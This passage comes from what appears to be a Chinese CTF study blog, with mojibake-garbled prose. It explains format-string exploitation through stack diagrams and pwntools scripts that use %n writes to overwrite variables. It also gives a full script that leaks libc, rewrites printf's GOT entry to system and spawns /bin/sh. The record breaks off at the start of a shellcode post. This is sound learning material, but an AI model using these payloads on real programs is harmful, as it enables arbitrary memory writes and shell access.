å‚æ•°nï¼ˆå¯èƒ½æ˜¯å‘½ä»¤è¡Œå‚æ•°ï¼‰       || å‚æ•°2                        || å‚æ•°1                        |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| è¿”å›åœ°å€ â†’ main              |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| ä¸Šä¸€ä¸ª ebp                   | â† ebp (vulnfunc çš„ ebp)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| vulnfunc å±€éƒ¨å˜é‡            || â€¦                            | â† esp ï¼ˆåœ¨ vulnfunc é‡Œï¼‰      â†“ ä½åœ°å€\n\nå½“ä½ åˆšè¿›å…¥ vulnfuncï¼š\n\nebp â†’ ä¸Šä¸€ä¸ª ebp\n\nebp+4 â†’ è¿”å›åœ°å€ï¼ˆè¿”å›åˆ° mainï¼‰\n\nebp-xx â†’ vulnfunc çš„å±€éƒ¨å˜é‡\n\nesp â†’ æœ€ä½å¤„ï¼ŒæŒ‡å‘å±€éƒ¨å˜é‡\n\n\nğŸŒŸ é˜¶æ®µ 1ï¸âƒ£ï¼šè°ƒç”¨ printf(format)\nå½“ vulnfunc è°ƒç”¨ï¼š\nprintf(format);\n\nè°ƒç”¨è€…æŠŠè¿”å›åœ°å€ &amp; å‚æ•°å‹å…¥æ ˆï¼š\n     â†‘ é«˜åœ°å€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°nï¼ˆmain çš„å‚æ•°ï¼‰           || â€¦                            |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| è¿”å›åœ°å€ â†’ main              |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| ä¸Šä¸€ä¸ª ebp                   | â† ebp (vulnfunc)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| vulnfunc å±€éƒ¨å˜é‡            |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°1=format                 | â† esp+4| è¿”å›åœ°å€ â†’ vulnfunc+ä¸‹ä¸€æ¡   | â† esp      â†“\n\næ­¤æ—¶ esp æŒ‡å‘ printf çš„è¿”å›åœ°å€ï¼Œå†å¾€ä¸Šæ˜¯ printf çš„å‚æ•°ã€‚\nğŸŒŸ é˜¶æ®µ 2ï¸âƒ£ï¼šè¿›å…¥ printf å\nåœ¨ printf å¼€å§‹æ‰§è¡Œåï¼Œå®ƒå»ºç«‹è‡ªå·±çš„æ ˆå¸§ï¼š\n      â†‘ é«˜åœ°å€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°nï¼ˆmain çš„å‚æ•°ï¼‰           || â€¦                            |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| è¿”å›åœ°å€ â†’ main              |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| ä¸Šä¸€ä¸ª ebp                   | â† ebp (vulnfunc)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| vulnfunc å±€éƒ¨å˜é‡            |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°1=format                 | â† ebp+8| è¿”å›åœ°å€ â†’ vulnfunc+ä¸‹ä¸€æ¡   | â† ebp+4| ä¸Šä¸€ä¸ª ebp                   | â† ebp (printf)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| printf å±€éƒ¨å˜é‡              | â† esp      â†“\n\nè¿™é‡Œï¼š\n\nprintf æŠŠå½“å‰çš„ ebp å‹æ ˆ\næŠŠ ebp è®¾ç½®ä¸º esp\nesp å†å‘ä¸‹ç•™å‡ºå±€éƒ¨å˜é‡ç©ºé—´\n\n\nscanfå‡½æ•°ä¼šæŠŠè¯»å–åˆ°çš„æ•°æ”¾åœ¨æ ˆä¸Šä¸€ä¸ªç©ºé—´ï¼Œç„¶å%pä¼šæŠŠå®ƒæ³„éœ²å‡ºæ¥\n\nä½¿ç”¨ scanf è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆæœ€å¤š 100 å­—èŠ‚ï¼‰ï¼Œå­˜å…¥ format ç¼“å†²åŒºï¼›\nç„¶åç›´æ¥å°†è¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ ç»™ printfï¼Œå³ï¼šprintf(format);\n\noverwrite(è¦†ç›–ä»»æ„åœ°å€å†…å­˜)\n\næ‰€ä»¥è¿™é“é¢˜çš„é‡ç‚¹æ˜¯ä¿®æ”¹å‡ ä¸ªæ•°çš„å€¼\n1ï¼‰å°†aè¦†ç›–ä¸º0x10ã€‚\n2ï¼‰å°†bè¦†ç›–ä¸º2ã€‚\n3ï¼‰å°†cè¦†ç›–ä¸º0x12345678ã€‚\nå…¶ä¸­aæ˜¯å±€éƒ¨å˜é‡ï¼Œb,cæ˜¯å…¨å±€å˜é‡\nå±€éƒ¨å˜é‡å­˜å‚¨åœ¨æ ˆä¸Šï¼Œå…¨å±€å˜é‡å­˜å‚¨åœ¨æ•°æ®æ®µä¸­ï¼ˆåˆ†ä¸ºå·²åˆå§‹åŒ–rodataå’Œæœªåˆå§‹åŒ–bssä¸¤éƒ¨åˆ†ï¼‰\n+---------------------+ &lt;--- é«˜å†…å­˜åœ°å€| å‘½ä»¤è¡Œå‚æ•° &amp; ç¯å¢ƒå˜é‡ |+---------------------+|       æ ˆ (Stack)    |  &lt;-- å±€éƒ¨å˜é‡ã€å‡½æ•°å‚æ•°ã€è¿”å›åœ°å€|                     ||   Function Call N   ||   (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)||   Function Call 2   ||   (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)||   Function Call 1   ||   (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)||        ...          ||                     ||        ç©ºé—²         ||                     |+---------------------+|       å † (Heap)     |  &lt;-- åŠ¨æ€åˆ†é…å†…å­˜ (malloc/new)|                     ||        ...          |+---------------------+|   .bss æ®µ (æœªåˆå§‹åŒ–æ•°æ®) |  &lt;-- æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ (ä¾‹å¦‚: b)+---------------------+|   .data æ®µ (å·²åˆå§‹åŒ–æ•°æ®) |  &lt;-- å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ (ä¾‹å¦‚: c)+---------------------+|     .text æ®µ (ä»£ç )   |  &lt;-- ç¨‹åºæ‰§è¡Œä»£ç  (æŒ‡ä»¤)+---------------------+|       ä¿ç•™åŒºåŸŸ      |+---------------------+ &lt;--- ä½å†…å­˜åœ°å€\n\n\n\naçš„å¤„ç†ï¼ˆå±€éƒ¨å˜é‡ï¼‰é¦–å…ˆï¼Œaæ˜¯å±€éƒ¨å˜é‡ï¼Œå±€éƒ¨å˜é‡æ˜¯å­˜å‚¨åœ¨æ ˆä¸Šçš„ï¼Œå…¶åœ°å€ä¼šå› ä¸ºå¼€å¯ASLRè€Œå˜åŒ–ï¼Œæ‰€ä»¥åœ¨å‡½æ•°ä¸­å°†açš„åœ°å€æ‰“å°å‡ºæ¥äº†\nè„šæœ¬from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&#x27;\\n&#x27;,drop=True),16)print(hex(a))payload=p32(a)+b&quot;%12c&quot;+b&quot;%8$n&quot;p.sendline(payload)m=p.recv()print(m)\n\nintå’Œu32()\n\n\n\nå‡½æ•°\n\n\n\n\n\n\nint(..., 16)\næ¥æ”¶åˆ°çš„æ˜¯å­—ç¬¦ä¸²å½¢å¼çš„åœ°å€ï¼ˆå¦‚&quot;0xffa79dbc&quot;ï¼‰\nè½¬æ¢ä¸ºæ•´æ•°åœ°å€\nä¸»åŠ¨æ³„éœ²åœ°å€\n\n\nu32(...)\næ¥æ”¶åˆ°çš„æ˜¯åŸå§‹ 4 å­—èŠ‚æ•°æ®ï¼ˆå¦‚b&#39;\\xbc\\x9d\\xa7\\xff&#39;ï¼‰\nå°†å°ç«¯åºçš„ 4 å­—èŠ‚è½¬ä¸ºæ•´æ•°\nè°ƒç”¨æ³„éœ²åœ°å€\n\n\nğŸ§© p32(a_addr) æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿ\næ„é€ çš„ p32(a_addr) ä¼šè¢« printf å½“ä½œä¸€ä¸ªå‚æ•°å¤„ç†ï¼š\n\nå®ƒè¢«å‹å…¥æ ˆä¸Šï¼›\n%8$n ä¼šä»ç¬¬ 8 ä¸ªå‚æ•°ä½ç½®è¯»å–å®ƒï¼›\nè¿™ä¸ªåœ°å€å°±æ˜¯å†™å…¥çš„ç›®æ ‡åœ°å€ã€‚\n\nğŸ§© %12c æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿï¼ˆç›®æ ‡æ˜¯16ï¼Œaçš„åœ°å€å å››ä¸ªå­—èŠ‚ï¼‰\n\n%12c è¾“å‡º 12 ä¸ªå­—ç¬¦ï¼ˆå¦‚ç©ºæ ¼ï¼‰ï¼›\n%n ä¼šæŠŠå½“å‰è¾“å‡ºçš„å­—ç¬¦æ€»æ•°å†™å…¥æŒ‡å®šåœ°å€ï¼›\næ‰€ä»¥ %12c çš„ä½œç”¨æ˜¯è®© %n å†™å…¥ 12ï¼›\nå®ƒæœ¬èº«ä¸å†™å…¥å†…å­˜ï¼Œä½†ä¼šå½±å“ %n çš„å€¼ã€‚\n\nä¸èƒ½æ¢æˆbâ€™aâ€™*12,è¿™ä¸ªä¸ä¼šå½±å“%nçš„æ€»æ•°\nå·¥ä½œåŸç†ï¼š\n\nå½“ printf(payload) æ‰§è¡Œæ—¶ï¼Œpayload å­—ç¬¦ä¸²ä¼šè¢«æ”¾åˆ°æ ˆä¸Šã€‚\nprintf å¼€å§‹è§£æ payloadã€‚å®ƒä¼šæŠŠ p32(a_addr) è§†ä¸ºä¸€ä¸ªæ™®é€šçš„å­—ç¬¦ä¸²ï¼ˆä½†å®ƒå®é™…ä¸Šæ˜¯ v1 çš„åœ°å€ï¼‰ã€‚\nç„¶åé‡åˆ° %12cï¼Œå®ƒè¾“å‡º 12 ä¸ªå­—ç¬¦ã€‚\næ¥ç€é‡åˆ° %8$nã€‚æ­¤æ—¶ printf å·²ç»è¾“å‡ºäº† 12 ä¸ªå­—ç¬¦ã€‚å®ƒä¼šå»æ ˆä¸Šå¯»æ‰¾ç¬¬ 8 ä¸ªå‚æ•°çš„åœ°å€ã€‚ç”±äº p32(a_addr) æ”¾åœ¨äº† payload çš„å¼€å¤´ï¼Œå¹¶ä¸”å…¶é•¿åº¦æ˜¯ 4 å­—èŠ‚ï¼Œå®ƒä¼šæ­£å¥½è½åœ¨æ ˆä¸Šç¬¬ 8 ä¸ªå‚æ•°çš„ä½ç½®ä¸Šï¼ˆè¿™ä¸ªåç§»é‡æ˜¯ç»è¿‡è°ƒè¯•ç¡®å®šçš„ï¼‰ã€‚\nprintf ä¼šå°†å½“å‰å·²è¾“å‡ºçš„å­—ç¬¦æ•° 12 å†™å…¥åˆ° p32(a_addr) æ‰€è¡¨ç¤ºçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯å±€éƒ¨å˜é‡ v1 çš„åœ°å€ã€‚\næœ€ç»ˆï¼Œv1 çš„å€¼è¢«ä¿®æ”¹ä¸º 12ã€‚\n\nbçš„å¤„ç†ï¼ˆå…¨å±€å°æ•°ï¼‰\nb,cçš„åœ°å€å¯ä»¥ç›´æ¥æ‰¾åˆ°\nè„šæœ¬from pwn import *p = process(&quot;./overwrite&quot;)elf = ELF(&quot;./overwrite&quot;)#gdb.attach(p,&quot;b printf&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))b=0x0804A028payload=b&#x27;aa&#x27;+b&#x27;%10$n&#x27;+b&#x27;b&#x27;+p32(b)p.sendline(payload)info=p.recvline()if b&quot;overwrite b for a small value&quot; in info:  print(b&quot;Success\\n&quot;)p.interactive()\n\nä¸ºä»€ä¹ˆä¸èƒ½æŒ‰ç…§è¦†ç›– a çš„æ–¹æ³•ï¼Ÿï¼ˆå› ä¸º%nï¼Œbçš„åœ°å€å·²ç»è¶…è¿‡2äº†ï¼Œæ‰€ä»¥bçš„åœ°å€åªèƒ½åœ¨%_$nä¹‹åï¼‰\n\nåç§»é‡è®¡ç®—çš„å·®å¼‚ï¼š åœ¨è¦†ç›– a çš„æ–¹æ³•ä¸­ï¼Œp32(a_addr) æ”¾åœ¨äº† payload çš„æœ€å¼€å¤´ï¼Œå¹¶ä¸” printf å‘ç°è¿™ä¸ªå¼€å¤´åœ¨å®ƒçš„å‚æ•°åˆ—è¡¨ä¸­æ˜¯ç¬¬ 8 ä¸ªã€‚ ä½†æ˜¯ï¼Œå¦‚æœå°† p32(b_addr) ä¹Ÿæ”¾åœ¨ payload çš„å¼€å¤´å¹¶å°è¯•ç”¨ %8$n å†™å…¥ï¼Œå¯èƒ½ä¼šé‡åˆ°é—®é¢˜ï¼š\nåœ°å€å€¼ä¸æ ¼å¼ç¬¦å†²çªï¼š0x0804A028 è¿™ä¸ªåœ°å€æœ¬èº«å¦‚æœè¢« printf è§£ææˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œå¯èƒ½ä¼šåŒ…å« % æˆ–å…¶ä»–ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¼è‡´ printf å´©æºƒæˆ–è¡Œä¸ºå¼‚å¸¸ã€‚ä¾‹å¦‚ï¼Œåœ°å€çš„æŸä¸ªå­—èŠ‚å¯èƒ½è¢«è§£é‡Šä¸º %s æˆ– %x çš„ä¸€éƒ¨åˆ†ï¼Œå¯¼è‡´ printf è¯•å›¾è¯»å–æ— æ•ˆçš„å†…å­˜åœ°å€ã€‚\næ§åˆ¶æ€§é—®é¢˜ï¼šæˆ‘ä»¬é€šå¸¸å¸Œæœ›å°†è¦å†™å…¥çš„åœ°å€æ”¾åœ¨æ ¼å¼å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œè¿™æ ·å®ƒå°±ä¸ä¼šè¢« printf è¯¯è®¤ä¸ºæ˜¯æ ¼å¼ç¬¦çš„ä¸€éƒ¨åˆ†æ¥å¤„ç†ï¼Œè€Œåªæ˜¯ä¸€ä¸ªæ™®é€šçš„ 4 å­—èŠ‚æ•°æ®ã€‚\n\n\n\n\n\n\nç‰¹æ€§\nè¦†ç›– v1 (å±€éƒ¨å˜é‡)\nè¦†ç›– b (å…¨å±€å˜é‡)\n\n\n\nç›®æ ‡ç±»å‹\næ ˆä¸Šçš„å±€éƒ¨å˜é‡\næ•°æ®æ®µä¸Šçš„å…¨å±€å˜é‡\n\n\nåœ°å€æ¥æº\nè¿è¡Œæ—¶æ³„éœ² (æ¯æ¬¡å¯èƒ½ä¸åŒ)\né™æ€å›ºå®š (ç¼–è¯‘æ—¶ç¡®å®š)\n\n\np32(addr) ä½ç½®\næ”¾åœ¨ payload çš„å¼€å¤´\næ”¾åœ¨ payload çš„æœ«å°¾\n\n\n%n åç§»\n8$ (å› ä¸ºåœ°å€æ”¾åœ¨å¼€å¤´ï¼Œä¸”åœ¨ç¬¬ 8 ä¸ªå‚æ•°ä½ç½®)\n10$ (å› ä¸ºåœ°å€æ”¾åœ¨æœ«å°¾ï¼Œä¸”åœ¨ç¬¬ 10 ä¸ªå‚æ•°ä½ç½®)\n\n\nä¸»è¦è€ƒé‡\nç¡®ä¿ p32(addr) ä¸è¢«è¯¯è§£ä¸ºæ ¼å¼ç¬¦ï¼Œä¸”åœ¨æ­£ç¡®åç§»\né¿å… b_addr å­—èŠ‚è¢«è¯¯è§£ä¸ºæ ¼å¼ç¬¦ï¼Œæ›´ç¨³å®šåœ°ä½œä¸ºå‚æ•°åœ°å€\n\n\nå¥½çš„ï¼Œå¦‚æœä½ ç¡®è®¤è¿™ä¸ª b æ˜¯å¿…é¡»çš„ï¼Œé‚£ä¹ˆå®ƒåœ¨ payload ä¸­çš„å­˜åœ¨ï¼Œå°±æ„å‘³ç€å®ƒåœ¨æ ˆçš„å¸ƒå±€å’Œ printf å¯¹å‚æ•°çš„è§£æä¸­èµ·åˆ°äº†å…³é”®ä½œç”¨ï¼Œé€šå¸¸æ˜¯ä¿è¯äº† p32(b_addr) çš„æ­£ç¡®å¯¹é½ï¼Œä½¿å…¶è½åœ¨ %10$n é¢„æœŸçš„å‚æ•°ä½ç½®ã€‚\nè®©æˆ‘ä»¬æ¥è¯¦ç»†åˆ†æï¼Œä¸ºä»€ä¹ˆå¤šä¸€ä¸ª b åè€Œå¯èƒ½æˆä¸ºâ€œå¿…é¡»çš„â€ã€‚\næœ‰ b çš„è¯¦ç»†åˆ†æ\npayload = b&quot;aa&quot; + b&quot;%10$n&quot; + b&quot;b&quot; + p32(b_addr)\n\nè®©æˆ‘ä»¬è®¡ç®—æ¯ä¸ªéƒ¨åˆ†çš„é•¿åº¦ï¼š\n\nb&quot;aa&quot;ï¼š2 å­—èŠ‚\nb&quot;%10$n&quot;ï¼š5 å­—èŠ‚\nb&quot;b&quot;ï¼š1 å­—èŠ‚\np32(b_addr)ï¼š4 å­—èŠ‚ (å‡è®¾ b_addr æ˜¯ 0x0804A028)\n\næ€»å­—èŠ‚æ•° &#x3D; 2 + 5 + 1 + 4 &#x3D; 12 å­—èŠ‚,åœ¨è¿™é‡Œï¼Œbæ˜¯ä¸ºäº†è¡¥è¶³å­—èŠ‚\ncçš„å¤„ç†ï¼ˆå…¨å±€å¤§æ•°ï¼‰\nè¿™æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œè€ƒè™‘é€å­—èŠ‚å†™å…¥\nè¿™é‡Œæƒ³æŠŠcè¦†ç›–ä¸º0x12345678ï¼Œè€Œcçš„åœ°å€æ˜¯0x0804A02Cï¼Œæ‰€ä»¥åŸºæœ¬ç›®æ ‡æ˜¯ï¼š\n0x0804A02C:\\x780x0804A02D:\\x560x0804A02E:\\x340x0804A02F:\\x12\n\nè„šæœ¬from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))c=0x0804A02Cpayload=fmtstr_payload(offset=8,writes=&#123;c:0x12345678&#125;)p.sendline(payload)info =p.recvline()if b&quot;overwrite c for a big value&quot; in info:  print(b&quot;Success&quot;)p.interactive()\n\n\n\nfmtstr_payloadfmtstr_payload æ˜¯ pwntools æä¾›çš„ä¸€ä¸ªè‡ªåŠ¨åŒ–å·¥å…· ï¼Œç”¨äºæ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆFormat String Vulnerabilityï¼‰çš„ payload ã€‚\nå®ƒçš„ä½œç”¨æ˜¯ï¼š\n\nè‡ªåŠ¨è®¡ç®—å­—ç¬¦æ•°å¹¶æ„é€  payloadï¼Œç”¨äºå†™å…¥ä»»æ„åœ°å€çš„å€¼ï¼ˆå¦‚ GOT è¡¨ã€å˜é‡ã€è¿”å›åœ°å€ç­‰ï¼‰ \n\nğŸ§ª fmtstr_payload çš„ä½¿ç”¨æ–¹æ³•\n\nåŸºæœ¬è¯­æ³•\n\nfrom pwn import *fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)\n\n\nå‚æ•°è¯´æ˜\n\n\n\n\n\n\n\n\n\noffset\næ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»é‡ï¼ˆä½ çš„è¾“å…¥åœ¨ç¬¬å‡ ä¸ª%pçš„ä½ç½®ï¼‰\n\n\nwrites\nä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºä½ è¦å†™å…¥çš„åœ°å€å’Œå€¼ï¼Œå¦‚&#123;addr1: value1, addr2: value2&#125;\n\n\nnumbwritten\nå·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ï¼ˆé»˜è®¤ä¸º 0ï¼Œå¯ä»¥å¿½ç•¥ï¼‰\n\n\nwrite_size\nå†™å…¥å¤§å°ï¼Œå¯é€‰ï¼š&#39;byte&#39;ã€&#39;short&#39;ã€&#39;int&#39;ï¼ˆé»˜è®¤æ˜¯&#39;byte&#39;ï¼‰\n\n\nğŸ§© ç¤ºä¾‹ 1ï¼šå†™å…¥ä¸€ä¸ªåœ°å€ä¸º 16\nfrom pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8  # åç§»é‡addr = elf.symbols[&#x27;a&#x27;]  # å‡è®¾ä½ è¦å†™å…¥å˜é‡ a çš„åœ°å€# æ„é€  payloadï¼šå†™å…¥ a = 16payload = fmtstr_payload(offset, &#123;addr: 16&#125;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive()\n\n\n\nğŸ§© ç¤ºä¾‹ 2ï¼šå†™å…¥å¤šä¸ªåœ°å€ï¼ˆå¦‚ a=16, b=2, c=0x12345678ï¼‰\nfrom pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8a_addr = elf.symbols[&#x27;a&#x27;]b_addr = elf.symbols[&#x27;b&#x27;]c_addr = elf.symbols[&#x27;c&#x27;]# æ„é€  payloadï¼šå†™å…¥å¤šä¸ªåœ°å€writes = &#123;    a_addr: 16,    b_addr: 2,    c_addr: 0x12345678&#125;payload = fmtstr_payload(offset, writes, write_size=&#x27;int&#x27;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive()\n\n\n\n\n\n\n\nfmt_demoï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç»¼åˆåˆ©ç”¨ï¼‰\n\nå¯ä»¥å…ˆæ³„éœ²libcçš„åŸºå€ï¼Œå¾—åˆ°systemå‡½æ•°çš„åœ°å€\nå†æ ¹æ®æ­¤æŠŠprintfçš„gotè¡¨å­˜å‚¨çš„åœ°å€æ¢ä¸ºsystemå‡½æ•°çš„åœ°å€\nä¹‹åè¾“å…¥å‚æ•°â€œ&#x2F;bin&#x2F;shâ€,å°±å¯ä»¥å®ç°\nè„šæœ¬from pwn import *from LibcSearcher import LibcSearcherp=process(&quot;./fmt_demo&quot;)elf=ELF(&quot;./fmt_demo&quot;)read_got=elf.got[&quot;read&quot;]payload=p32(read_got)+b&quot;%4$s&quot;p.send(payload.ljust(0x100,b&quot;\\x00&quot;))read=u32(p.recv(8)[4:])print(hex(read))libc=LibcSearcher(&quot;read&quot;,read)libc_base=read-libc.dump(&quot;read&quot;)system=libc_base+libc.dump(&quot;system&quot;)payload=fmtstr_payload(offset=4,writes=&#123;elf.got[&quot;printf&quot;]:system&#125;)p.sendline(payload.ljust(0x100,b&quot;\\x00&quot;))bin=b&quot;/bin/sh&quot;p.sendline(bin.ljust(0x100,b&quot;\\x00&quot;))p.interactive()\n\n\n\n\n\n\n\n\n\n\né‚£ä¸ºä»€ä¹ˆè¿˜è¦å¡«è¡¥ payload çš„é•¿åº¦ä¸º 0x100 å­—èŠ‚ï¼Ÿâ€\n\næˆ‘ä»¬æ¥ä» â€œpayload è¢«å¤åˆ¶åˆ°æ ˆä¸Šâ€ è¿™ä¸ªç°è±¡å‡ºå‘ï¼Œè§£é‡Šä¸ºä»€ä¹ˆæˆ‘ä»¬æœ‰æ„åœ° å°† payload å¡«å……åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100 å­—èŠ‚ï¼‰ï¼Œå°½ç®¡å®ƒå¯èƒ½ä¼šè¢«å¤åˆ¶åˆ°æ ˆä¸Šã€‚\nâœ… ç®€çŸ­å›ç­”ï¼š\n\næˆ‘ä»¬å¡«è¡¥ payload åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100 å­—èŠ‚ï¼‰ï¼Œæ˜¯ä¸ºäº†è®© payload è¢«å®Œæ•´å¤åˆ¶åˆ°æ ˆä¸Šï¼Œä»è€Œè®©åç§»å›ºå®šã€å¸ƒå±€å¯æ§ï¼Œä¾¿äºåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›è¡Œåœ°å€æ³„éœ²æˆ–å†™å…¥æ“ä½œã€‚ \n\nğŸ“Œ payload çš„ä¸¤ç§â€œå‘½è¿â€ï¼š\n\n\n\n\n\n\n\n\n\n\n1ï¸âƒ£ payload çŸ­\n&lt; ä¸€äº›å‚æ•°é•¿åº¦\nprintfä»æ ˆä¸Šè¯»å–å‚æ•°\npayload åœ¨ buf ä¸­ï¼Œå‚æ•°åœ¨æ ˆä¸Š\n\n\n2ï¸âƒ£ payload é•¿\n&gt; ä¸€å®šé•¿åº¦ï¼ˆå¦‚ 100 å­—èŠ‚ï¼‰\nprintfæŠŠ payload å¤åˆ¶åˆ°æ ˆä¸Š\npayload æœ¬èº«å°±åœ¨æ ˆä¸Š\n\n\nğŸ§© ä¸ºä»€ä¹ˆè¦â€œæ•…æ„â€è®© payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šï¼Ÿ\nâœ… ä¼˜ç‚¹ä¸€ï¼šåç§»å›ºå®šï¼Œä¾¿äºè°ƒè¯•\n\npayload è¢«å¤åˆ¶åˆ°æ ˆä¸Šåï¼Œå®ƒåœ¨æ ˆä¸Šçš„ä½ç½®æ˜¯å›ºå®šçš„ã€‚\næˆ‘ä»¬å¯ä»¥ç²¾å‡†æ§åˆ¶åç§»ï¼ˆæ¯”å¦‚ %4$s å°±ä¸€å®šè¯»å– payload ä¸­çš„åœ°å€ï¼‰ã€‚\né¿å…äº†å›  payload é•¿åº¦ä¸åŒå¯¼è‡´åç§»å˜åŒ–çš„é—®é¢˜ã€‚\n\nâœ… ä¼˜ç‚¹äºŒï¼šä¾¿äºæ„é€ å†™å…¥æ“ä½œï¼ˆå¦‚ %nï¼‰\n\nå½“æˆ‘ä»¬æƒ³ç”¨ %n å†™æŸä¸ªåœ°å€æ—¶ï¼Œéœ€è¦ç¡®ä¿åœ°å€åœ¨æ ˆä¸Šï¼Œä¸”åç§»å›ºå®šã€‚\nå¦‚æœ payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠåœ°å€æ”¾åœ¨ payload å¼€å¤´ï¼Œç„¶åç”¨ %1$n ç²¾å‡†å†™å…¥ã€‚\n\nâœ… ä¼˜ç‚¹ä¸‰ï¼šé˜²æ­¢ payload è¢«æˆªæ–­æˆ–åç§»æ¼‚ç§»\n\nå¦‚æœ payload é•¿åº¦ä¸å›ºå®šï¼Œå¯èƒ½å¯¼è‡´åç§»å˜åŒ–ï¼Œ%sã€%n è¯»å†™é”™è¯¯åœ°å€ã€‚\nå¡«å……åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100ï¼‰å¯ä»¥é¿å…è¿™ç§æ¼‚ç§»ã€‚\n\n:grey_question:ä½†æˆ‘å…¶å®ä¸å¤ªç†è§£   \n","categories":["pwn_study"],"tags":["PWN","æ ¼å¼åŒ–å­—ç¬¦ä¸²"]},{"title":"simple_shellcode","url":"/2025/08/29/simple-shellcode/","content":"é¢˜ç›®\n\n\nMEMORY[0xCAFE0000]: è¿™éƒ¨åˆ†è¡¨ç¤ºç¨‹åºæ­£åœ¨è®¿é—®å†…å­˜åœ°å€ 0xCAFE0000 å¤„çš„å†…å®¹ã€‚\n(): åœ¨ C&#x2F;C++ ç­‰ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œåœ†æ‹¬å· () é€šå¸¸è¡¨ç¤ºå‡½æ•°è°ƒç”¨ã€‚\n\nåˆèµ·æ¥ï¼Œè¿™å¥è¯çš„æ„æ€å°±æ˜¯ï¼šå°†å†…å­˜åœ°å€ 0xCAFE0000 ä¸­çš„å†…å®¹è§†ä¸ºä¸€ä¸ªå‡½æ•°ï¼ˆæˆ–ä¸€æ®µå¯æ‰§è¡Œä»£ç ï¼‰ï¼Œå¹¶ç«‹å³æ‰§è¡Œå®ƒã€‚\n\nè¯¥æ²™ç®±ä¸»è¦é€šè¿‡ seccomp è¿‡æ»¤å™¨ç¦ç”¨äº†ä¸æ‰§è¡Œæ–°ç¨‹åºå’Œæå‡æƒé™ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç‰¹åˆ«æ˜¯ execve å’Œ 